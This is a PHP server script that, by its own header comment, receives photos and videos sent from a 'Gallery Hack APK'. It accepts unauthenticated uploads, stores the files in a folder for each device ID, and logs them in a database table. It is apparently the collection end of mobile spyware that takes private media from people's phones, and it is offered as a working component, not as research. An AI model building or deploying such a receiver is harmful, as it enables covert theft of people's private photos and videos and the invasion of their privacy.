<?php
// gallery_upload.php — Receives photos & videos from the Gallery Hack APK

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit; }

require_once __DIR__ . '/db.php';

// ── Upload directory setup ───────────────────────────────────────
$uploadRoot = __DIR__ . '/gallery_uploads';
if (!is_dir($uploadRoot)) mkdir($uploadRoot, 0755, true);
$ha = $uploadRoot . '/.htaccess';
if (!file_exists($ha)) file_put_contents($ha, "Options -Indexes\nRequire all granted\n");

// ── Auto-create DB table ─────────────────────────────────────────
try {
    getDB()->exec("CREATE TABLE IF NOT EXISTS gallery_uploads (
        id           INT AUTO_INCREMENT PRIMARY KEY,
        device_id    VARCHAR(64)   NOT NULL,
        media_type   ENUM('image','video') DEFAULT 'image',
        filename     VARCHAR(255)  NOT NULL,
        filepath     VARCHAR(512)  NOT NULL,
        filesize     BIGINT        DEFAULT 0,
        captured_at  TIMESTAMP     DEFAULT CURRENT_TIMESTAMP,
        INDEX idx_device (device_id),
        INDEX idx_time   (captured_at)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");
} catch (Exception $e) {}

// ── Validate device_id ───────────────────────────────────────────
$deviceId  = preg_replace('/[^a-zA-Z0-9_-]/', '', $_POST['device_id'] ?? '');
if (!$deviceId) $deviceId = 'dev_' . substr(md5(mt_rand()), 0, 12);

$mediaType = (($_POST['media_type'] ?? 'image') === 'video') ? 'video' : 'image';

// ── File validation ──────────────────────────────────────────────
if (!isset($_FILES['photo']) || $_FILES['photo']['error'] !== UPLOAD_ERR_OK) {
    echo json_encode(['error' => 'upload error', 'code' => $_FILES['photo']['error'] ?? -1]);
    exit;
}

$file = $_FILES['photo'];

// Allowed extensions — images + videos
$allowedImg = ['jpg','jpeg','png','gif','webp','heic','heif','bmp'];
$allowedVid = ['mp4','mpeg','mpg','mov','3gp','avi','mkv','webm','m4v'];
$ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
if (!in_array($ext, array_merge($allowedImg, $allowedVid))) {
    echo json_encode(['error' => 'file type not allowed', 'ext' => $ext]); exit;
}

// Auto-detect media type from extension
if (in_array($ext, $allowedVid)) $mediaType = 'video';
if (in_array($ext, $allowedImg)) $mediaType = 'image';

// Max sizes: 50MB for videos, 20MB for images
$maxSize = ($mediaType === 'video') ? 50 * 1024 * 1024 : 20 * 1024 * 1024;
if ($file['size'] > $maxSize) {
    echo json_encode(['error' => 'file too large', 'size' => $file['size']]); exit;
}

// ── Save file to disk ────────────────────────────────────────────
$deviceDir = $uploadRoot . '/' . $deviceId;
if (!is_dir($deviceDir)) mkdir($deviceDir, 0755, true);

$safeName = time() . '_' . mt_rand(100, 999) . '.' . $ext;
$destPath = $deviceDir . '/' . $safeName;
$webPath  = 'gallery_uploads/' . $deviceId . '/' . $safeName;

if (!move_uploaded_file($file['tmp_name'], $destPath)) {
    echo json_encode(['error' => 'failed to save file']); exit;
}

// ── Save record to DB ────────────────────────────────────────────
try {
    getDB()->prepare("
        INSERT INTO gallery_uploads (device_id, media_type, filename, filepath, filesize)
        VALUES (?, ?, ?, ?, ?)
    ")->execute([$deviceId, $mediaType, $safeName, $webPath, $file['size']]);
} catch (Exception $e) {}

echo json_encode([
    'ok'         => true,
    'saved'      => $safeName,
    'type'       => $mediaType,
    'device_id'  => $deviceId,
]);
